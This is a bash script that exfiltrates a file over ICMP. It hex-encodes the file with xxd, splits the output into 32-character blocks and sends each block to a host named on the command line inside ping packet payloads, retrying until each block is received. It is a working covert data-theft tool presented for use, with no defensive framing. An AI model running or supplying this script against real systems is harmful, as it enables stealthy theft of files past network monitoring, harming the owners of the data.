#!/bin/bash

# Sending file through ICMP Package using PING

# function to read file and convert from ascii into hexadecimal
read_file(){
  read_hex=$( { cat $1 | xxd -p | tr -d '\n'; } 2>&1 );
  echo $read_hex;
}

# function to ping 1 time to host
is_up(){
  check_ping=$( { ping -c 1 $1; } 2>&1);
  echo $check_ping
}

# function to sending icmp package
# split it into 32 character per block and send sending it in each loop
send_icmp_packet(){
  BLOCK_SIZE=32;
  hex_data=$1;

  for ((i=0; i<${#hex_data}; i+=$BLOCK_SIZE));
    do
      payload=${hex_data:i:$BLOCK_SIZE};
      echo "[SENDING] PAYLOAD $payload";
      send_icmp=$( { ping -c 1 -p $payload $2; } 2>&1);

      while [[ $send_icmp != *"1 received"* ]];
        do
          echo "[FAILED] SENDING PAYLOAD $payload";
          echo "[RETRY] SENDING PAYLOAD $payload";
          send_icmp=$( { ping -c 1 -p $payload $2; } 2>&1);
        done

      echo "[SUCCESS] SENDING PAYLOAD: $payload";
    done

  return 0;
}

if [ $# -ne 2 ]; then
  echo "Usage: $0 <file> <host>";
  exit 1;
fi

file_hex_data=$(read_file $1);
if [[ $file_hex_data == *"cat"* ]]; then
  echo "[ERROR] $file_hex_data";
  exit 1
fi

check_up=$(is_up "$2");
if [[ $check_up == "ping"* ]]; then
  echo "[ERROR] $check_up";
  exit 1;
fi

if [[ $check_up != *"1 received"* ]]; then
  echo "[ERROR] check your connecttion or is host $2 is correct?";
  exit 1;
fi

send_icmp_packet $file_hex_data $2;
echo -ne "[DONE] Script finish running\n";
